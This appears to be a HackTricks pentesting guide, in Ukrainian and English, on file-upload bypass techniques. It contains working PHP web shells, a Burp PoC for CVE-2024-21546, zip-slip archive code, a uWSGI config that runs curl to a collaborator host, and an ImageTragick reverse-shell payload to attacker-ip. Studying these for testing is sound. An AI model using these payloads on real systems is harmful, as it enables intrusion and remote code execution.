# Завантаження файлів

{{#include ../../banners/hacktricks-training.md}}

## Загальна методологія завантаження файлів

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Обхід перевірок розширень файлів

1. Якщо застосовано, **перевірте** **попередні розширення.** Також тестуйте їх, використовуючи **великі букви**: _pHp, .pHP5, .PhAr ..._
2. _Перевірте **додавання валідного розширення перед** виконуваним розширенням (використовуйте попередні розширення також):_
- _file.png.php_
- _file.png.Php5_
3. Спробуйте додати **спеціальні символи в кінці.** Ви можете використати Burp для **bruteforce** всіх **ascii** та **Unicode** символів. (_Зауважте, що ви також можете спробувати використати **раніше** згадані **розширення**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Спробуйте обманути парсер розширень на стороні сервера техніками, як-от **подвоєння** **розширення** або **додавання зайвих** даних (**null** bytes) між розширеннями. _Ви також можете використати **попередні розширення**, щоб підготувати кращий payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Додайте **ще один шар розширень** до попередніх перевірок:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Спробуйте помістити **виконувальне розширення перед валідним розширенням** і сподівайтесь, що сервер неправильно налаштовано. (корисно для експлуатації помилкових конфігурацій Apache, де будь-що з розширенням **.php**, але **не обов'язково закінчується на .php**, буде виконуватись):
- _ex: file.php.png_
7. Використання **NTFS alternate data stream (ADS)** у **Windows**. У цьому випадку після забороненого розширення і перед дозволеним буде вставлено символ двокрапки ":". В результаті на сервері буде створено **порожній файл із забороненим розширенням** (наприклад, "file.asax:.jpg”). Цей файл може бути змінений пізніше за допомогою інших технік, як-от використання його короткої назви файлу. Шаблон "**::$data**” також можна використати для створення непорожніх файлів. Тому додавання символу крапки після цього шаблону також може бути корисним для обходу подальших обмежень (наприклад, "file.asp::$data.”)
8. Спробуйте перевантажити ліміти імені файлу. Валідне розширення обрізається. А шкідливий PHP залишається. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Деякі обробники завантаження обрізають або нормалізують кінцеві крапки в збереженому імені файлу. В UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) версіях до 2.9.1 можна обійти перевірку розширень, зробивши:

- Використовуючи валідний image MIME та magic header (наприклад, PNG’s `\x89PNG\r\n\x1a\n`).
- Назвавши завантажений файл з PHP-розширенням, за яким слідує крапка, наприклад, `shell.php.`.
- Сервер обрізає кінцеву крапку і зберігає `shell.php`, який виконуватиметься, якщо його розміщено в web-доступній директорії (за замовчуванням public storage, як `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Потім зверніться до збереженого шляху (типово для Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Enforce strict server-side allowlists and re-validate the persisted filename.
- Serve uploads from non-executable locations.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Обійти перевірки **Content-Type**, встановивши **value** **header** **Content-Type** на: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Обійти перевірку **magic number**, додавши на початок файлу **байти реального зображення** (заплутати команду _file_). Або вставити шелл у **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` або ви також можете **ввести payload безпосередньо** в зображення:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Якщо до вашого зображення застосовується **compression**, наприклад за допомогою стандартних PHP-бібліотек на кшталт [PHP-GD](https://www.php.net/manual/fr/book.image.php), попередні техніки можуть стати неефективними. Однак ви можете використати **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), щоб вставити текст, який **виживе після стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Веб-сторінка також може **змінювати розміри (resizing)** зображення, використовуючи, наприклад, PHP-GD функції `imagecopyresized` або `imagecopyresampled`. Однак ви можете використати **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), щоб вставити текст, який **виживе після стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Інша техніка для створення payload, який **виживе при зміні розміру зображення**, використовуючи PHP-GD функцію `thumbnailImage`. Однак ви можете використати **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), щоб вставити текст, який **виживе після стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Знайдіть вразливість, яка дозволяє **rename** вже завантажений файл (щоб змінити розширення).
- Знайдіть вразливість **Local File Inclusion**, щоб виконати backdoor.
- **Possible Information disclosure**:
1. Завантажте **кілька разів** (і водночас) **той самий файл** з **тим самим іменем**
2. Завантажте файл з **ім'ям** файлу або **папки**, яка **вже існує**
3. Завантаження файлу з ім'ям **".”, "..”, або "…”**. Наприклад, в Apache на **Windows**, якщо додаток зберігає завантажені файли в директорії "/www/uploads/” , ім'я файлу "." створить файл з назвою "uploads” в директорії "/www/”.
4. Завантаження файлу, який може бути важко видалити, наприклад **"…:.jpg”** на **NTFS**. (Windows)
5. Завантаження файлу в **Windows** з **недопустимими символами** у назві, такими як `|<>*?”` . (Windows)
6. Завантаження файлу в **Windows** з використанням **зарезервованих** (**заборонених**) **імен**, таких як CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Також спробуйте **upload an executable** (.exe) або **.html** (менш підозріле), яке **виконає код**, коли випадково буде відкрито жертвою.

### Special extension tricks

Якщо ви намагаєтеся завантажити файли на **PHP server**, [зверніть увагу на **.htaccess** трюк для виконання коду](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Якщо ви намагаєтеся завантажити файли на **ASP server**, [перегляньте **.config** трюк для виконання коду](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Файли `.phar` схожі на `.jar` для java, але для php, і можуть бути **used like a php file** (виконуватися за допомогою php або включатися в скрипт...).

Розширення `.inc` іноді використовують для php-файлів, які лише **import files**, тому іноді хтось міг дозволити **this extension to be executed**.

## **Jetty RCE**

Якщо ви можете завантажити XML-файл на Jetty server, ви можете отримати [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Отже, як вказано на зображенні нижче, завантажте XML-файл в `$JETTY_BASE/webapps/` і очікуйте shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Для детального вивчення цієї вразливості перевірте оригінальне дослідження: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) вразливості можуть бути експлуатовані на uWSGI серверах, якщо є можливість змінити `.ini` configuration file. Файли конфігурації uWSGI використовують специфічний синтаксис для включення "magic" змінних, плейсхолдерів і операторів. Зокрема, оператор '@', який використовується як `@(filename)`, призначений для включення вмісту файлу. Серед різних підтримуваних схем в uWSGI, схема "exec" є особливо потужною, оскільки дозволяє читати дані зі standard output процесу. Цю можливість можна зловмисно використовувати для Remote Command Execution або Arbitrary File Write/Read, коли обробляється `.ini` configuration file.

Розгляньте наступний приклад шкідливого `uwsgi.ini` файлу, що демонструє різні schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Виконання payload відбувається під час парсингу файлу конфігурації. Щоб конфігурація була активована і розібрана, процес uWSGI має бути або перезапущений (ймовірно після крашу або через Denial of Service attack), або файл має бути встановлений на auto-reload. Функція auto-reload, якщо увімкнена, перезавантажує файл через задані інтервали при виявленні змін.

Важливо розуміти лояльний характер парсингу файлу конфігурації uWSGI. Зокрема, обговорюваний payload можна вставити в бінарний файл (наприклад зображення або PDF), що ще більше розширює можливості експлуатації.

## **wget File Upload/SSRF Trick**

В деяких випадках ви можете виявити, що сервер використовує **`wget`** для **завантаження файлів** і ви можете **вказати** **URL**. У таких випадках код може перевіряти, що розширення завантажуваних файлів знаходиться в whitelist, щоб запевнити, що будуть завантажені лише дозволені файли. Однак, **цю перевірку можна обійти.**\
**Максимальна** довжина **імені файлу** в **linux** становить **255**, однак **wget** обрізає імена файлів до **236** символів. Ви можете **завантажити файл з іменем "A"\*232+".php"+".gif"**, це ім'я файлу **обійде** **перевірку** (оскільки в цьому прикладі **".gif"** є **допустимим** розширенням), але `wget` **перейменує** файл у **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Зауважте, що **ще один варіант**, який може прийти вам у голову, щоб обійти цю перевірку — змусити **HTTP сервер перенаправити на інший файл**, тож початковий URL пройде перевірку, а потім wget завантажить перенаправлений файл з новим ім'ям. Це **не спрацює** **якщо тільки** wget використовується з **параметром** `--trust-server-names`, тому що **wget завантажить перенаправлену сторінку з ім'ям файлу, вказаним у початковому URL**.

## Інструменти

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) — потужний інструмент, призначений допомагати Pentesters and Bug Hunters у тестуванні механізмів завантаження файлів. Він використовує різні bug bounty techniques, щоб спростити процес ідентифікації та експлуатації вразливостей, забезпечуючи всебічну оцінку web applications.

### Corrupting upload indices with snprintf quirks (historical)

Деякі застарілі обробники завантажень, які використовують `snprintf()` або подібні функції для побудови масивів з багатьма файлами з однофайлового завантаження, можна обдурити, змусивши сфальсифікувати структуру `_FILES`. Через невідповідності та обрізання в поведінці `snprintf()`, ретельно сформоване однофайлове завантаження може виглядати як кілька проіндексованих файлів на боці сервера, плутаючи логіку, яка припускає жорстку структуру (наприклад, трактуючи це як multi-file upload і вибираючи небезпечні гілки). Хоча сьогодні це нішево, цей шаблон “index corruption” час від часу з'являється в CTFs та старих кодових базах.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Розширення Burp


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Магічні заголовкові байти

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Розпакування в різні папки

Несподіване створення файлів у каталогах під час розпакування є серйозною проблемою. Незважаючи на початкові припущення, що така конфігурація може захищати від виконання команд на рівні ОС через шкідливі завантаження файлів, підтримка ієрархічного стиснення та можливості directory traversal формату архівів ZIP можуть бути використані. Це дозволяє атакуючим обійти обмеження та вийти за межі захищених каталогів завантаження, маніпулюючи функцією розпакування цільового додатка.

Автоматизований експлойт для створення таких файлів доступний на [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Утиліту можна використовувати, як показано:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Крім того, **symlink trick with evilarc** — це варіант. Якщо метою є отримати доступ до файлу на кшталт `/flag.txt`, слід створити symlink на цей файл у вашій системі. Це гарантує, що evilarc не зіткнеться з помилками під час своєї роботи.

Нижче наведено приклад Python-коду, що використовується для створення шкідливого zip-файлу:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Для детальнішої інформації **перегляньте оригінальний допис на**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-код записано для виконання команд, переданих через змінну `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Створюються кілька файлів і збирається zip-архів, що містить ці файли.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Імена файлів всередині zip змінюються за допомогою vi або hex-редактора, замінюючи "xxA" на "../" для переходу між директоріями.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Завантажте цей вміст з розширенням зображення, щоб exploit the vulnerability **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Вбудовування PHP Shell у PNG

Вбудовування PHP shell у IDAT chunk PNG-файлу може ефективно обходити певні операції обробки зображень. Функції `imagecopyresized` та `imagecopyresampled` з PHP-GD особливо релевантні в цьому контексті, оскільки зазвичай використовуються для зміни розміру та ресемплінгу зображень відповідно. Здатність вбудованого PHP shell залишатися неушкодженим цими операціями є значною перевагою для певних випадків використання.

Детальний розгляд цієї техніки, включно з методологією та потенційними застосуваннями, наведено в наступній статті: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Цей ресурс дає всебічне розуміння процесу та його наслідків.

Детальніше: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files слугують унікальним інструментом у кібербезпеці, поводячись як хамелеони, які можуть коректно існувати одночасно у кількох форматах файлів. Цікавим прикладом є [GIFAR](https://en.wikipedia.org/wiki/Gifar), гібрид, який функціонує і як GIF, і як RAR-архів. Такі файли не обмежуються цією комбінацією; можливі й поєднання на кшталт GIF і JS або PPT і JS.

Основна користь polyglot files полягає в їхній здатності обходити механізми безпеки, що сканують файли за типом. Звичайна практика в різних додатках — дозволяти для завантаження лише певні типи файлів, наприклад JPEG, GIF або DOC, щоб зменшити ризик потенційно шкідливих форматів (наприклад, JS, PHP або Phar). Однак polyglot, відповідаючи структурним критеріям кількох форматів файлів, може непомітно обійти ці обмеження.

Незважаючи на їхню адаптивність, polyglots мають обмеження. Наприклад, хоча polyglot може одночасно бути PHAR-файлом (PHp ARchive) і JPEG, успіх його завантаження може залежати від політики платформи щодо розширень файлів. Якщо система суворо контролює допустимі розширення, сама по собі структурна подвійність polyglot може не забезпечити дозволу на завантаження.

Детальніше: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Завантаження валідних JSON, ніби це PDF

Як уникнути виявлення типу файлу, завантаживши валідний JSON-файл навіть якщо це не дозволено, підробивши PDF-файл (техніки з **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: доки magic-байти `%PDF` знаходяться в перших 1024 байтах, це вважається валідним (див. приклад у пості)
- **`pdflib` library**: додайте фейковий PDF-формат всередину поля JSON так, щоб бібліотека подумала, що це pdf (див. приклад у пості)
- **`file` binary**: він може читати до 1048576 байтів з файлу. Просто створіть JSON більший за цей розмір, щоб він не зміг розпарсити вміст як JSON, а потім всередині JSON вставте початкову частину реального PDF — і він вважатиме це PDF

## Посилання

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
